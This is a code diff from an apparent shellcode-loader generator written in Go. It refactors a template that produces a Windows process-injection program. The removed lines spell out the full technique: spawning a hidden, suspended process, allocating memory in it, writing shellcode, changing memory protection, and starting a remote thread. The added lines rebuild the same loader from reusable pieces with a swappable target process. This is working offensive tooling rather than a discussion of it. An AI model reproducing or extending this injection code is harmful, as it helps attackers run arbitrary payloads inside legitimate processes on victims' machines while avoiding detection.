@@ -2,68 +2,21 @@ package loaders
 
 import (
 	"fmt"
+	"strings"
 )
 
-func GetCRTxTemplate(targetProcess string) string {
-	return fmt.Sprintf(`
-package main
-
-import (
-    "syscall"
-    "unsafe"
-)
-
-
-const (
-    MEM_COMMIT                = 0x1000
-    MEM_RESERVE               = 0x2000
-    PAGE_READWRITE            = 0x4
-    PAGE_EXECUTE_READ         = 0x20
-    PAGE_EXECUTE_READWRITE    = 0x40
-    CREATE_SUSPENDED          = 0x4
-    CREATE_NO_WINDOW          = 0x8000000
-)
-
-var (
-    kernel32            = syscall.MustLoadDLL("kernel32.dll")
-
-	VirtualAllocEx          = kernel32.MustFindProc("VirtualAllocEx")
-	VirtualProtectEx        = kernel32.MustFindProc("VirtualProtectEx")
-	WriteProcessMemory      = kernel32.MustFindProc("WriteProcessMemory")
-	CreateRemoteThreadEx    = kernel32.MustFindProc("CreateRemoteThreadEx")
-)
-
-func loadProcess(target string) *syscall.ProcessInformation {
-    var si syscall.StartupInfo
-	var pi syscall.ProcessInformation
-
-	commandLine, err := syscall.UTF16PtrFromString(target)
-	if err != nil {
-		panic(err)
-	}
-
-    err = syscall.CreateProcess(
-		nil,
-		commandLine,
-		nil,
-		nil,
-		false,
-		CREATE_SUSPENDED | CREATE_NO_WINDOW,
-		nil,
-		nil,
-		&si,
-		&pi,
-    ); if err != nil {
-		panic(err)
-	}
-
-	return &pi
+type CRTxTemplate struct {
+	CRTTemplate
 }
 
-func ExecuteOrderSixtySix(shellcode []byte){
+func (t CRTxTemplate) Const() string {
+	return strings.Replace(t.CRTTemplate.Const(), "CreateRemoteThread", "CreateRemoteThreadEx", 1)
+}
 
-    /* spawn target process */
-    process := loadProcess("%s")
+func (t CRTxTemplate) Process() string {
+	return fmt.Sprintf(`
+	/* spawn target process */
+    process := loadProcess("__PROCESS__")
     oldProtectCfg := PAGE_READWRITE
 
     /* allocating the appropriate amount of memory */
@@ -103,7 +56,29 @@ func ExecuteOrderSixtySix(shellcode []byte){
         0,
         0,
     )
+`)
 }
 
-    `, targetProcess)
+func (t CRTxTemplate) GetTemplate(targetProcess string) string {
+	var template = `
+package main
+
+__IMPORT__STATEMENT__
+
+__CONST__STATEMENT__
+
+__IMPORT__INIT__	
+
+func ExecuteOrderSixtySix(shellcode []byte) {
+
+__IMPORT__PROCESS__
+
+}
+`
+	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.CRTTemplate.Import(), -1)
+	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
+	template = strings.Replace(template, "__IMPORT__INIT__", t.CRTTemplate.Init(), -1)
+	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)
+
+	return strings.Replace(template, "__PROCESS__", targetProcess, -1)
 }
